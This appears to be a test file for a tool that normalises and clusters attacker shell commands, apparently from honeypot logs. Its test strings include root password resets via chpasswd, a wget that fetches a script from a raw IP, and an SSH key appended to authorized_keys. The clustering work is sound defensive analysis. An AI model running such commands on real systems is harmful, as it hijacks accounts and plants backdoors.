from app.command_normalize import family_key, normalize_command


def test_random_check_tokens_collapse():
    a = "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_2cca6c1bf32f4eff826cacde288c0eb8'\"'\"''"
    b = "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_fdb3ed82ce28439a1b2c3d4e5f60718'\"'\"''"
    assert normalize_command(a) == normalize_command(b)
    assert "<HEX>" in normalize_command(a)


def test_random_arithmetic_challenges_collapse():
    a = "printf '\\n%s|%s\\n' 'check_0123456789ab_small_math' \"$((593*647+9))\""
    b = "printf '\\n%s|%s\\n' 'check_ba9876543210_small_math' \"$((531*835+58))\""
    assert normalize_command(a) == normalize_command(b)
    # Numbers outside arithmetic stay: "sleep 5" and "sleep 60" are different behaviour.
    assert normalize_command("sleep 5") != normalize_command("sleep 60")


def test_replayed_login_password_collapses():
    a = "echo 'root12' | sudo -S sh -c 'chmod +x /root/.16' || chmod +x '/root/.16'"
    b = "echo '123qwerty' | sudo -S sh -c 'chmod +x /root/.16' || chmod +x '/root/.16'"
    assert normalize_command(a) == normalize_command(b)
    assert normalize_command(a).startswith("echo '<PASS>' | sudo -S")


def test_random_new_password_collapses_but_target_user_stays():
    a = 'echo "root:81V1Mga130kv"|chpasswd|bash'
    b = 'echo "root:9edFpSPY4D9s"|chpasswd|bash'
    assert normalize_command(a) == normalize_command(b) == 'echo "root:<PASS>"|chpasswd|bash'
    assert normalize_command('echo "admin:x1"|chpasswd') != normalize_command('echo "root:x1"|chpasswd')


def test_temp_paths_and_ips_collapse():
    assert normalize_command("chmod +x /tmp/x8Fq2/sshd; wget http://45.9.148.1/a.sh") == normalize_command(
        "chmod +x /tmp/Zz91k/sshd; wget http://103.4.5.66/a.sh"
    )
    assert normalize_command("cd /dev/shm/.a1b2 && ./run") == "cd /dev/shm/<TMP> && ./run"


def test_stable_commands_are_kept_verbatim():
    assert normalize_command("uname -s -v -n -r -m") == "uname -s -v -n -r -m"
    # The same SSH key across variants must stay part of the identity, not be blurred.
    key = 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr mdrfckr" >> .ssh/authorized_keys'
    assert normalize_command(key) == key


def test_family_key_depends_on_sequence_not_on_tokens():
    first = family_key(["cd /tmp/aaaa1", "echo check_0123456789abcdef"])
    assert first == family_key(["cd /tmp/bbbb2", "echo check_fedcba9876543210"])
    assert first != family_key(["echo check_0123456789abcdef", "cd /tmp/aaaa1"])


def test_family_key_is_none_without_commands():
    assert family_key([]) is None
